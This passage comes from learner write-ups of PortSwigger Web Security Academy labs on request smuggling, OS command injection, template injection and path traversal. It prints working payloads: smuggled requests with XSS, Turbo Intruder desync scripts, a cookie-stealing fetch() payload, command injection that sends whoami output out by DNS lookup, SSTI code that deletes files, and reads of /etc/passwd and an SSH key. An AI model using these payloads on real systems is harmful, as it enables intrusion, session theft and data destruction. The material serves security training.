surface is the HTTP headers and the smuggled request path. I tried visiting /admin and got blocked with an IP restriction. The search function re\ufb02ects the search parameter value, giving me a way to leak data. I sent a request twice with Content-Length: 124 and Transfer-Encoding: chunked, smuggling a second POST request that forces the front-end's rewritten request to appear in the search results. The second response showed \"Search results for\" followed by the rewritten request, revealing the custom IP header name. I noted the header, then sent another smuggled request accessing /admin with that header set to 127.0.0.1. The admin panel loaded. I modi\ufb01ed the smuggled request to delete carlos, sent it twice, and solved the lab. The vulnerability is two servers seeing the same bytes differently. Front-end added an IP header, but I used request smuggling to make the back-end show me what that header looked like. Once I knew the header name, I could spoof localhost and bypass the IP restriction"}, {"num": "9.6", "difficulty": "PRACTITIONER", "title": "Bypassing front-end controls via CL.TE", "content": "Try to visit the endpoint /admin and This request is blocked. Send the GET / to the repeater. Changing request to Post and adding body k=1 and changing method to http/1.1 to know that request smuggling is possible in the request or not Now by addting the local host in smuggled request we can see that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request. Now we have created a full smuggled request and sent first time we can see 200 response with no error of duplicate header. When we send second time we See the /admin page which also shows us method to delete carlos Using the previous response as a reference, change the smuggled request URL to delete carlos. Selecting the text or smuggled request at end through right click on mouse and scrolling down in repeater will tell you its content length in right side of inspector tab which is 138 and in hex it is 0x8a"}, {"num": "9.7", "difficulty": "PRACTITIONER", "title": "Bypassing front-end controls via TE.CL", "content": "Visiting the endpoint /admin blocked us."}, {"num": "9.8", "difficulty": "PRACTITIONER", "title": "Revealing front-end request rewriting", "content": "Send the GET / to the repeater then We have to use CL.TE vulnerability using timing techniques. Since the front-end server uses the Content-Length header, it will forward only part of this request, omitting the X. The back-end server uses the Transfer-Encoding header, processes the \ufb01rst chunk, and then waits for the next chunk to arrive. This will cause an observable time delay. We can see in the right last corner it take more than 10 second to reach to the server This request now contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it. And con\ufb01rm that CL.TE vulnerability exits.I have also try TE.CL but failed. To exploit this Browse to /admin and observe that the admin panel can only be loaded from 127.0.0.1.Use Burp Repeater to issue the following request twice. The second response should contain \"Search results for\" followed by the start of a rewritten HTTP request. Note the name of the X-*-IP header in the rewritten request, and use it to access the admin panel. Using the previous response as a reference, change the smuggled request URL to delete the user carlos and after sending request multiple time we get 302 which mean Carlos is deleted and lab is solved."}, {"num": "9.9", "difficulty": "PRACTITIONER", "title": "Capturing other users\u2019 requests", "content": "Comment as Carlos Montoya then send that request to the repeater, Change the place of comment body and place it to the end. Then use this request: After a long time trial and error, I \ufb01nally get that session cookie .I then go to login page and send it to repeater,change the endpoint to /my-account and change the cookie session."}, {"num": "9.10", "difficulty": "PRACTITIONER", "title": "Delivering re\ufb02ected XSS via request smuggling", "content": "The objective of this lab is to smuggle a malicious request to the back-end server so that the next user\u2019s request receives a response that contains the XSS payload. I visit a blog post and send it to the repeater ,I noticed that it has a User-Agent header that is re\ufb02ected to what i input. I craft a request since the front-end server doesn\u2019t support chunked encoding, i use a Transfer-Encoding chunked header to smuggle a second request. POST / HTTP/1.1 Host: 0a0900e704a8aa6e8146581c002900b0.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked GET /post?postId=7 HTTP/1.1 User-Agent: a\"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 The Content-Length of the outer request must be carefully calculated to include the smuggled request up to the \ufb01nal x=1. The back-end will process the smuggled GET request, and its response will be cached or queued for the next user's connection."}, {"num": "9.11", "difficulty": "PRACTITIONER", "title": "H2.TE response queue poisoning", "content": "I crafted a single POST request containing two requests: the \ufb01rst (outer) request is HTTP/2, and the smuggled request at the bottom is an HTTP/1 GET request. Both requests use invalid or gibberish endpoints so that they return a 404 response. I sent this request to Burp Intruder to automate many such requests, and I waited for a 302 response because it contains the administrator's session cookie. This exploit manipulates how the frontend and backend servers handle request boundaries differently. By poisoning the response queue, the attacker can hijack redirect responses intended for other users, effectively stealing session cookies and gaining unauthorized access."}, {"num": "9.12", "difficulty": "PRACTITIONER", "title": "H2.CL request smuggling", "content": "In this H2.CL request smuggling lab, the front-end server supports HTTP/2 but the back-end uses HTTP/1.1, creating a mismatch in how request length is determined. To exploit this, I crafted a malicious JavaScript payload (alert(document.cookie)) and hosted it on the exploit server under the /resources path. I \ufb01rst go to the homepage and send the root to the repeater and remove unnecessary headers and add a random word \u201cSmuggled\u201d and send the POST / HTTP2 request. When i receive the 404 response it con\ufb01rms that it caused to the back-end to append the subsequent request to smuggled pre\ufb01x. Next, I noticed that accessing /resources triggers a redirect to /resources/. I then crafted a smuggled request targeting /resources with a Host header pointing to my exploit server. This request, when queued after a victim's request, would cause the victim to be redirected to the exploit server, executing the JavaScript and exposing their cookies. On the exploit server, change the \ufb01le name to /resources and add a alert(document.cookie) on the body and click store. I send the previous Request to the intruder and when i get 200 in a rows it means that the one of the request was intercepted by the lab victim. I used Burp Intruder to automate sending this malicious request repeatedly. When I observed a 200 response in a row, it meant a victim's request had been intercepted and the payload executed. This attack exploits discrepancies between front-end and back-end servers in handling HTTP/2 and HTTP/1.1 request boundaries. By smuggling a request with a malicious Host header, an attacker can poison the response queue, redirecting users to an attacker-controlled site and stealing sensitive data like session cookies."}, {"num": "9.13", "difficulty": "PRACTITIONER", "title": "HTTP/2 smuggling via CRLF injection", "content": "This is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests to HTTP/1.1 but fails to sanitize incoming headers properly, allowing CRLF injection. The goal is to exploit this \ufb02aw to hijack another user's session, as the victim visits the homepage every 15 seconds. First, I tested for the vulnerability by sending a malicious request, receiving a 404 response con\ufb01rmed the smuggling vector was working.Add a Transfer Chunked. Going back to our website, attempt to search any strings and send the POST request to repeater. Remove unnecessary headers. Copy that POST request and i paste it to our previous GET request and send. I continuously add some content-length to see the session key."}, {"num": "9.14", "difficulty": "PRACTITIONER", "title": "HTTP/2 request splitting via CRLF injection", "content": "This is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests to HTTP/1.1 without sanitizing headers, allowing CRLF injection. The goal is to poison the response queue, capture an admin session cookie, and delete user carlos. An admin logs in every 10 seconds, and the back-end connection resets after 10 requests. Using the Inspector, add a header with a value containing CRLF sequences to smuggle a second request. When downgraded, the \\r\\n\\r\\n completes the \ufb01rst request and injects the smuggled request. Change also the path to something that is non existing, so it will return us 404 error. Send this malicious request to poison the response queue. Wait 5 seconds, then send another request to fetch a response. A non-404 response indicates you've captured a response intended for the admin. Use the stolen cookie to access /admin, \ufb01nd the URL to delete carlos (/admin/delete?username=carlos), and send that request to solve the lab."}, {"num": "9.15", "difficulty": "PRACTITIONER", "title": "CL.0 request smuggling", "content": "This shows a CL.0 request smuggling attack. The front\u2011end server uses the Content-Length header to know where a request ends, but the back\u2011end server ignores it for some endpoints. This mismatch allows an attacker to sneak an extra request into the connection and reach restricted pages like /admin. The goal is to delete the user carlos. I \ufb01rst looked for an endpoint where the back\u2011end ignores Content-Length. I sent two requests in the same connection using Burp Repeater. In the \ufb01rst request, I added a tiny body and a smuggled request inside it. If the second request got a 404 (the response I expected from my smuggled request), it meant the endpoint was vulnerable. I found that static \ufb01les under /resources/, like /resources/images/blog.svg, worked. I then changed the smuggled request to GET /admin HTTP/1.1. When I sent the two requests in sequence over the same connection, the back\u2011end processed the smuggled request and returned the admin panel. I swapped the smuggled request with GET /admin/delete?username=carlos and sent the same sequence again. This deleted carlos and solved the lab. POST /resources/images/blog.svg HTTP/1.1 Host: 0a8300f703533ee082c4ed8e009e0050.web-security-academy.net Cookie: session=tGp5S57JLYRbkSyXukDkzuil7fD2ZYmY Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 51 GET /admin/delete?username=carlos HTTP/1.1 Foo : x The vulnerability happens because the back\u2011end does not always respect the Content-Length header."}, {"num": "9.16", "difficulty": "EXPERT", "title": "0.CL request smuggling", "content": "The goal of this lab is to exploit a 0.CL request smuggling vulnerability to inject an XSS payload into the victim\u2019s browser, causing an alert() to execute. Since Carlos visits the homepage every 5 seconds, a successful smuggled request will deliver the payload to his browser, popping the alert and solving the lab. When testing the early\u2011response gadget, I observed that any request to a path under /resources/ even with arbitrary appended stringsn consistently returned a 302 Found redirect, with the Location header re\ufb02ecting /resources/?adsas<asdas). Right click and use Turbo Intruder extensions. In the request editor (top pane),It was the simple GET /post request with the lab\u2019s host header. This de\ufb01nes the target host and no cookie is needed. In the script editor (bottom pane), I pasted the pre\u2011written Turbo Intruder script that performs a double\u2011desync 0.CL attack. The script includes the XSS payload in a smuggled GET /post?postId=... request. # Refer to https://portswigger.net/research/http1-must-die def queueRequests(target, wordlists): host = \"0a820045040184cd804230ac001b00ce.web-security-academy.net\" engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10, requestsPerConnection=1, engine=Engine.BURP, maxRetriesPerRequest=0, timeout=15 ) # The attack should contain an early-response gadget and a (maybe obfuscated) Content-Length header with the value set to %s stage1 = '''POST /resources/css/anything HTTP/1.1 Host: '''+host+''' Content-Type: application/x-www-form-urlencoded Connection: keep-alive Content-Length : %s ''' # This will get pre\ufb01xed to the victim's request - place your payload in here smuggled = '''GET /post?postId=8 HTTP/1.1 User-Agent: a\"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1''' # If the server doesn't like GET with a body, try OPTIONS etc stage2_chopped = '''OPTIONS / HTTP/1.1 Content-Length: 123 X: Y''' stage2_revealed = '''GET /404 HTTP/1.1 Host: '''+host+''' User-Agent: foo Content-Type: application/x-www-form-urlencoded Connection: keep-alive ''' victim = '''GET / HTTP/1.1 Host: '''+host+''' User-Agent: foo ''' # No need to edit below this line if '%s' not in stage1: raise Exception('Please place %s in the Content-Length header value') if not stage1.endswith('\\r\\n\\r\\n'): raise Exception('Stage1 request must end with a blank line and have no body') while True: engine.queue(stage1, len(stage2_chopped), label='stage1', \ufb01xContentLength=False) engine.queue(stage2_chopped + stage2_revealed + smuggled, label='stage2') engine.queue(victim, label='victim') def handleResponse(req, interesting): table.add(req) # 0.CL attacks use a double desync so they can take a while! # Uncomment & customise this if you want the attack to automatically stop on success if req.label == 'victim' and 'Congratulations' in req.response: req.engine.cancel() This script works as it performs a double-desync attack (0 . CL) that : \u25cf Sends a stage1 request with a Content-Length header"}, {"num": "9.17", "difficulty": "EXPERT", "title": "Web cache poisoning via request smuggling", "content": "This lab combines request smuggling with web cache poisoning. The front\u2011end server uses the Content-Length header to know where a request ends, but the back\u2011end server uses Transfer-Encoding: chunked. This mismatch allows an attacker to \u201csmuggle\u201d a hidden request. By smuggling a request that redirects a cached JavaScript \ufb01le to an attacker\u2011controlled server, anyone who loads that \ufb01le will execute malicious JavaScript. POST / HTTP/1.1 Host: 0ab2006a049c9dee80b494fa00e100f9.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 129 Transfer-Encoding: chunked GET /post/next?postId=3 HTTP/1.1 Host: anything Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=1 I \ufb01rst found a request that could be smuggled: the \u201cNext post\u201d feature. I sent a request with both Content-Length and Transfer-Encoding headers. The front\u2011end saw only the Content-Length and forwarded a short body, while the back\u2011end saw the Transfer-Encoding and kept reading. This let me hide a second request inside the \ufb01rst one. The smuggled request changed the Host header for the \u201cNext post\u201d redirect. I then prepared an exploit server that hosted a \ufb01le at /post containing alert(document.cookie). I smuggled the same request again, this time setting the Host header to my exploit server. After that, I requested the JavaScript \ufb01le /resources/js/ tracking.js . Because the cache stored the poisoned redirect, every subsequent request for that \ufb01le was redirected to my exploit server, executing the payload. The victim\u2019s browser loaded the poisoned \ufb01le, and the lab was solved. The \ufb02aw is that the front\u2011end and back\u2011end parse HTTP headers differently, creating a smuggling opportunity. The cache then stores the poisoned response, affecting all users. To prevent this, use HTTP/2, which avoids these header con\ufb02icts, and ensure that all servers in the chain treat requests identically. Always keep caches separate from request processing logic."}, {"num": "9.18", "difficulty": "EXPERT", "title": "Web cache deception via request smuggling", "content": "This uses request smuggling to trick the cache into saving a victim\u2019s private information. The front\u2011end and back\u2011end servers disagree on how to split requests. By smuggling a request that asks for the victim\u2019s account page, the cache mistakenly stores that page as if it were a static \ufb01le. Then we can retrieve it and steal the victim\u2019s API key. I logged in to my own account to see how the API key is shown on /my-account. I noticed that page has no anti\u2011caching headers, so it could be cached. I sent a smuggled request that contained a GET /my-account hidden inside a normal POST. The front\u2011end sent the POST to the back\u2011end, but the back\u2011end also saw the hidden GET request. Because the back\u2011end processed that hidden request, the victim\u2019s future request for a static resource (like a CSS \ufb01le) got mixed up with the account page. The cache saved the account page under the static resource\u2019s URL. Then I visited that static resource URL in an incognito window and found the victim\u2019s API key. I submitted it to solve the lab. The problem is that the two servers split requests differently, letting an attacker \u201chide\u201d a request inside another. The cache then saves sensitive data where it shouldn\u2019t. To prevent this, make sure all servers use the same request parsing rules, and never cache pages that contain private information. Using HTTP/2 can also avoid this kind of confusion."}, {"num": "9.19", "difficulty": "EXPERT", "title": "Access control bypass via HTTP/2 tunnelling", "content": "This uses a trick called HTTP/2 request tunneling. The front\u2011end server changes HTTP/2 requests into HTTP/1.1 before sending them to the back\u2011end. It also lets attackers inject newlines into header names, which lets them \u201ctunnel\u201d a whole second request inside the \ufb01rst one. This bypasses access controls so an attacker can reach the admin panel and delete a user. I \ufb01rst sent a normal HTTP/2 request and used the Inspector to add a header with a newline and a fake Host header inside its name. The error message proved the server accepted the injected content. I found that the search function worked both as a GET and as a POST. I change the request method and add a new header foo:bar. I crafted a POST request with a special header that added a huge Content-Length and an extra search parameter, making the request body longer than the Content-Length. This caused the server to think the request was still incomplete, and it responded with debugging headers that showed how it authenticates users. I saw three important headers: X-SSL-VERIFIED, X-SSL-CLIENT-CN, and X-FRONTEND-KEY. I changed my attack to tunnel a GET /admin request, adding those three headers with values that would make me look like an administrator (X-SSL-VERIFIED: 1, X-SSL-CLIENT-CN: administrator, and the real X-FRONTEND-KEY from the previous response). The \ufb01rst attempt failed because the admin page was too big, so I pointed the tunnel to /login instead, which gave me the full response. Inside that response I found the deletion URL, updated my tunnelled request to GET /admin/delete?username=carlos, and sent it again. The user carlos was deleted, solving the lab. The problem is that the front\u2011end does not properly clean header names, allowing newline characters to create a second request inside the \ufb01rst. The back\u2011end then processes this second request as if it came from the front\u2011end itself, inheriting its authentication headers."}, {"num": "9.20", "difficulty": "EXPERT", "title": "Web cache poisoning via HTTP/2 tunnelling", "content": "This shows how HTTP/2 request tunnelling can poison a website\u2019s cache. The front\u2011end server changes HTTP/2 requests into HTTP/1.1 before sending them to the back\u2011end, and it doesn\u2019t properly clean special characters in headers. An attacker can \u201ctunnel\u201d a hidden request inside a normal one and then make the cache store a malicious response. When the victim visits the home page, their browser runs a script that shows alert(1). I started by sending a normal HTTP/2 request to the home page. I injected extra data into the :path pseudo\u2011header, adding a newline and a fake header. The server accepted it, so I knew I could inject. Next, I looked for a page that would re\ufb02ect my input without encoding it. I noticed that the /resources endpoint redirects, and I could add a query string. This is the script that we will be using: /?cachebuster=3 HTTP/1.1\\r\\n Host: YOUR-LAB-ID.web-security-academy.net\\r\\n \\r\\n GET /resources?<script>alert(1)</script> HTTP/1.1\\r\\n Foo: bar I create 9,000 bytes of A .This are the extra characters that we will be adding on our script to create a tunnelled response that longer than that length. This made the server accept it, and my script appeared in the cached response. I con\ufb01rmed the cache was poisoned by visiting the home page with the same cache\u2011buster parameter and seeing the alert. Finally, I removed the cache\u2011buster and repeatedly sent the request to keep the cache poisoned. When the victim loaded the home page, they got the malicious cached version and the alert \ufb01red, solving the lab. The problem here is that the front\u2011end downgrades HTTP/2 to HTTP/1.1 without properly sanitising injected characters, allowing an attacker to hide a second request. The cache then stores the response from that hidden request, which can contain malicious code."}, {"num": "9.21", "difficulty": "EXPERT", "title": "Client-side desynchronization", "content": "The server ignores the Content-Length header on some requests, which lets us trick a victim\u2019s browser into sending a \u201chidden\u201d second request. By carefully crafting that second request, we can make the victim post a comment that leaks their session cookie. Then we steal it and log in as them. I started by sending a normal GET / request in Burp Repeater. The server responded with a redirect to /en. I turned off the \u201cUpdate Content-Length\u201d option, changed the method to POST, set Content-Length: 1, and left the body empty. The server answered immediately instead of waiting for data - a clue that it ignores the Content-Length on this endpoint. I re\u2011enabled \u201cUpdate Content-Length\u201d and added a smuggled request inside the body: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Connection: keep-alive Content-Length: (correct value) GET /hopefully404 HTTP/1.1 Foo: x For the 2nd request,Send again a GET request with the same tab group. When you sent them on a single connection, the second request\u2019s start appeared in the comment of the blog post. That meant you could capture arbitrary data (like cookies) in a comment. To identify the Content length of the Number of bytes to capture. I select the csrf body of 1st request and 2nd request. (111 bytes + 91 bytes = 202) . Send the request in single connection and a new comment would pop up. This script is part of a client\u2011side desync attack. Its goal is to steal the victim\u2019s session cookie by tricking the server into treating a hidden HTTP request as if it came from the victim\u2019s browser. fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', { method: 'POST', body: 'POST /en/post/comment HTTP/1.1\\r\\nHost: YOUR-LAB-ID.h1-web-security-academy.net\\r\\nCookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE\\r\\nContent-Length: NUMBER-OF-BYTES-TO-CAPTURE\\r\\nContent-Type: x-www-form-urlencoded\\r\\nConnection: keep-alive\\r\\n\\r\\ncsrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-aca demy.net&website=https://portswigger.net&comment=', mode: 'cors', credentials: 'include', }).catch(() => { fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', { mode: 'no-cors', credentials: 'include' }) }) Store and send to the victim. Then a new comment would pop up, so let\u2019s now change the content length in able to read this full request. The problem is that the server didn\u2019t pay attention to the Content-Length header, so an attacker could make the victim\u2019s browser send two requests squished into one. The second request\u2019s data ended up in a blog comment, where the attacker could read it and steal the victim\u2019s session cookie. To stop this, servers must always trust Content-Length and reject weird requests. Using HTTP/2 also \ufb01xes it because it doesn\u2019t rely on these tricky headers."}, {"num": "9.22", "difficulty": "EXPERT", "title": "Pause-based server-side request smuggling", "content": "This shows a trick called pause\u2011based request smuggling. The front\u2011end and back\u2011end servers handle requests differently. When the back\u2011end waits for more data on certain pages, an attacker can sneak a hidden request inside a normal one. By doing this, they can reach the admin panel and delete a user. I \ufb01rst checked what web server the lab used. The response header said \u201cApache 2.4.52\u201d, which is known to be vulnerable on pages that redirect, like when you visit a directory without a slash. I found that going to /resources gave a redirect to /resources/. I then used Turbo Intruder to send a POST request to /resources. I added a hidden GET /admin inside the body and told Turbo Intruder to pause for 61 seconds right after the headers. This pause made the back\u2011end keep the connection open, so it processed the hidden request separately. After the pause, I saw a response for the hidden GET /admin. It said the admin panel is only for local users, but that con\ufb01rmed the vulnerability worked. def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=500, pipeline=False) # First request: pause after we see 'Content-Length: 41\\r\\n\\r\\n' in the response, # or after 61 seconds (61000 ms) if the marker isn't seen. engine.queue(target.req, pauseMarker=['Content-Length: 41\\r\\n\\r\\n'], pauseTime=61000) # Second request: sent after the pause engine.queue(target.req) def handleResponse(req, interesting): table.add(req) I copied the CSRF token and the username \ufb01eld name. I then modi\ufb01ed my hidden request to be a POST to /admin/delete with the CSRF token and username=carlos. I told Turbo Intruder to pause only after the \ufb01rst set of headers (so it wouldn\u2019t pause again inside the hidden request). After the pause, the request went through and deleted carlos, solving the lab. The vulnerability comes from the back\u2011end server pausing on certain requests, allowing an attacker to split one connection into two requests."}]}, {"num": "10", "title": "OS Command Injection", "labs": [{"num": "10.2", "difficulty": "PRACTITIONER", "title": "Blind command injection using time delays", "content": "I intercepted the feedback submission request in Burp and found the email parameter. I modi\ufb01ed its value to x||ping+-c+10+127.0.0.1||. This payload uses the || operator, which means \"if the \ufb01rst command fails, run the second one.\" Since email=x is not a valid system command, it failed and triggered the ping command, sending 10 packets to localhost. When I sent the request, the response took exactly 10 seconds to return, con\ufb01rming the blind OS command injection. The app takes whatever you type (like x||ping...) and treats it as actual system commands, not just plain text data. That's why it runs the ping and causes a delay."}, {"num": "10.3", "difficulty": "PRACTITIONER", "title": "Blind command injection with output redirection", "content": "Do this if the images on your HTTP history tab is not showing :"}, {"num": "10.4", "difficulty": "PRACTITIONER", "title": "Blind command injection with out-of-band interaction", "content": "I intercepted the feedback submission request in Burp and located the email parameter. To test for blind OS command injection, I modi\ufb01ed the value to: email=x||nslookup+x.<YOUR-COLLABORATOR-PAYLOAD>|| The || operators mean \"if the \ufb01rst command fails, run the next one.\" Since email=x isn't a real command, the server executed nslookup with a unique subdomain from Burp Collaborator. This caused the server to perform a DNS lookup to that address, which was captured by Collaborator. I then checked Burp Collaborator and saw the interaction, con\ufb01rming the vulnerability. But wait, let\u2019s talk about Burp Collaborator , it is a tool that acts like a listening post on the internet. It gives you a special, unique URL or domain that you can inject into vulnerabilities, and then it waits for the server to contact it. The app blindly passes user input to a system command, allowing attackers to inject their own commands. Even though no output is returned, we can still prove the \ufb02aw by forcing the server to interact with an external service (like a DNS lookup). To prevent this, never execute system commands with user input. Use safe APIs, validate all input, and ensure commands cannot reach the shell."}, {"num": "10.5", "difficulty": "PRACTITIONER", "title": "Blind command injection with out-of-band ex\ufb01ltration", "content": "I intercepted the feedback submission request in Burp and focused on the email parameter. To ex\ufb01ltrate data, I used a payload that combines command injection with Burp Collaborator: email=||nslookup+whoami.YOUR-COLLABORATOR-SUBDOMAIN|| This payload uses the || operator to ensure the nslookup command runs after the fake email=x command fails. Inside the nslookup command, backticks execute whoami \ufb01rst to get the current username, and that output becomes part of the subdomain being looked up. So when the server performs the DNS query to my Collaborator server, it sends the username along with it, allowing me to ex\ufb01ltrate that information. After sending the request, I saw DNS interactions appear. The subdomain contained the output of the whoami command in this case, Peter-AqH. I entered that username to complete the lab."}]}, {"num": "11", "title": "Server-Side Template Injection (SSTI)", "labs": [{"num": "11.2", "difficulty": "PRACTITIONER", "title": "SSTI in code execution context", "content": "I change the user.\ufb01rst_name to something that really doesn't exist. When i send the request it was successful but if i refresh the application, it gives me an error that says it\u2019s related to tornado template. Since the user \ufb01eld was vulnerable, i will change it to payloads from hacktricks. The application uses Tornado templates and unsafely handles user input in a code context. The blog-post-author-display parameter controls how usernames appear in comments, and its value is placed directly into the template expression. Attack surface is this parameter, which lets users inject template syntax from within an existing expression. I crafted {% import os %} to load the os module, then used {{os.system('rm /home/carlos/morale.txt')}} to delete the \ufb01le. I URL-encoded the payload, sent it as the parameter value, and reloaded the comment page. The server executed the command and solved the lab."}, {"num": "11.3", "difficulty": "PRACTITIONER", "title": "SSTI using template documentation", "content": "The product description templates use the Freemarker engine with ${...} syntax. By inserting an invalid expression, the error message reveals the engine type. Using Freemarker\u2019s new() built\u2011 in, we can instantiate the Execute class to run arbitrary system commands. First is log-in as content manager. I changed an expression to ${foobar} and saved. The error message con\ufb01rmed the engine was Freemarker. I checked the Freemarker documentation and found that the new() built\u2011in can create Java objects, and the Execute class allows shell commands. The highlighted text was not even exist, im just testing and to see what\u2019s the error. It shows us it was from a Freemarker java. Then i look at the hackertricks website and then i use that script."}, {"num": "11.4", "difficulty": "PRACTITIONER", "title": "SSTI in unknown language with documented exploit", "content": "The message parameter in the product page renders text on screen and appears vulnerable to template injection. Fuzzing with invalid syntax triggers error messages that reveal the template engine. Attack surface is the message parameter where user input gets evaluated server side. Using Intruder i inject this some basic payloads to test and see the vulnerability: {{7*7}} ${{7*7}} {{7+7}} {{7*7}} <967*796> I injected a fuzz string with various template syntax into the message parameter. The error message identi\ufb01ed Handlebars as the template engine. I searched online for Handlebars server side template injection exploits and found a well known payload. I modi\ufb01ed the exploit to call require child_process and execute rm /home/carlos/morale.txt. I URL encoded the entire payload and delivered it through the message parameter. The server executed the command and deleted the \ufb01le, solving the lab. The vulnerability happened because user input got evaluated as template code. %7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67% 7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%2 0%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63 %6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68% 69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2 e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75% 62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20 %20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20% 20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%6 1%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20 %20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20% 20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%7 2%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27 %29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%7 3%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20 %20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20% 20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7 d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73 %74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65% 6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7 b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77 %69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68% 7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%2 0%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68 %7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d"}, {"num": "11.5", "difficulty": "PRACTITIONER", "title": "SSTI with information disclosure via user objects", "content": "The product description templates are editable by content managers and use server side template rendering. An object containing application data is passed into the template context. Attack surface is the template editing functionality where user controlled template code can access this object and its properties. I logged in as content manager and edited a product template. I injected a fuzz string with invalid syntax and the error message revealed Django as the template engine. Django documentation showed the debug tag displays all objects available in the template context. I added {% debug %} to the template and saved. The output listed accessible objects including the settings object. Django documentation explained settings contains a SECRET_KEY with serious security implications. I replaced the debug tag with {{settings.SECRET_KEY}}, saved the template, and the key appeared on the page. I submitted the key and solved the lab. The vulnerability happened because the template had access to sensitive objects it didn't need. The settings object with the secret key should never have been passed into the template context."}, {"num": "11.6", "difficulty": "EXPERT", "title": "SSTI in sandboxed environment", "content": "This uses Freemarker with a sandbox that allows access only to certain objects. By leveraging the product object available in templates, we can traverse Java\u2019s class hierarchy and invoke methods to escape the sandbox. First is to logged in as a content-manager and edit a product template. The template had access to a product object. I tested ${product.getClass()} and it returned the object\u2019s class, confirming I could call Java methods. Then i use this script : This payload starts from the product object and navigates through its class metadata to \ufb01nd the code source location, then constructs a \ufb01le URI pointing to the target \ufb01le, reads its contents as bytes, and converts them to decimal numbers joined by spaces. Then i copy the result and paste it to a decoder."}, {"num": "11.7", "difficulty": "EXPERT", "title": "SSTI with custom exploit development", "content": "The preferred name feature on the account page is vulnerable to server-side template injection. By experimenting with the available user object, we can call methods to set arbitrary files as the user\u2019s avatar and then read them. I logged in as wiener and I upload \ufb01les and also update my email and set what is my preferred name, I intercept the request to see the headers. As I see on the error when I edit my name I can use the variable setAvatar() to read \ufb01les Then I accessed /avatar?avatar=wiener and received the contents of /etc/passwd, con\ufb01rming I could read any \ufb01le. Next, I located the PHP \ufb01le mentioned in an error message when uploading an invalid image: /home/carlos/User.php. I read that \ufb01le using the same technique and discovered a method called gdprDelete() that deletes the user\u2019s avatar. I set the target \ufb01le Carlos\u2019s SSH private key as my avatar using user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg') and reloaded the comment to apply it."}]}, {"num": "12", "title": "Path Traversal", "labs": [{"num": "12.2", "difficulty": "PRACTITIONER", "title": "Absolute path bypass", "content": "I opened Burp Suite and intercepted a request for a product image. In the request, I found a \ufb01lename parameter that pointed to the image. Since the lab said traversal sequences like ../ were blocked, I tried a different approach: using an absolute path. I changed the \ufb01lename value to /etc/passwd and forwarded the request. The server responded with the contents of the /etc/passwd \ufb01le, con\ufb01rming the path traversal vulnerability. The vulnerability is that the application accepts absolute paths when fetching \ufb01les, allowing attackers to read any \ufb01le on the server. Even though traversal sequences were blocked, the lack of proper validation on the \ufb01le path made it possible to bypass restrictions."}, {"num": "12.3", "difficulty": "PRACTITIONER", "title": "Non-recursive traversal stripping bypass", "content": "I intercepted a product image request in Burp and changed the \ufb01lename parameter to ....//....//....//etc/passwd. Because the application only strips ../ once, the nested pattern bypassed the \ufb01lter and returned the contents of /etc/passwd. The app tries to block ../ by removing it, but it only removes it once. So by sending ....//, the app removes the middle part and turns it into ../, which still works. To \ufb01x this, the app must keep removing ../ over and over until none are left. That way, no matter how you hide it, all ../ get stripped and you can't escape the folder."}, {"num": "12.4", "difficulty": "PRACTITIONER", "title": "URL decoding bypass", 